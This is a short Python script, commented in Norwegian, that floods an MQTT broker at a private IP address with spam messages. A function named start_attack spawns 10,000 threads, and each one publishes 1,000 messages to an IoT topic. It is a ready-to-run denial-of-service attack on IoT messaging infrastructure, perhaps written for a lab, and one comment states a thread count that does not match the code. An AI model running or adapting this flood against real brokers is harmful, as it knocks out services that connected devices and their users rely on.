import paho.mqtt.client as mqtt
import threading

BROKER_IP = "10.2.8.52"
BROKER_PORT = 1883
TOPIC = "iot/device/data"

def send_messages():
    client = mqtt.Client()
    client.connect(BROKER_IP, BROKER_PORT)
    client.loop_start()  # Start MQTT-loopen for kontinuerlig kommunikasjon
    for _ in range(1000):
        client.publish(TOPIC, "Spam message")
    client.disconnect()


def start_attack():
    threads = []
    for _ in range(10000):  # Opprett 100 tråder
        t = threading.Thread(target=send_messages)
        threads.append(t)
        t.start()
        print(f"Tråd {t.ident} startet.")
    for t in threads:
        t.join()

if __name__ == "__main__":
    start_attack()
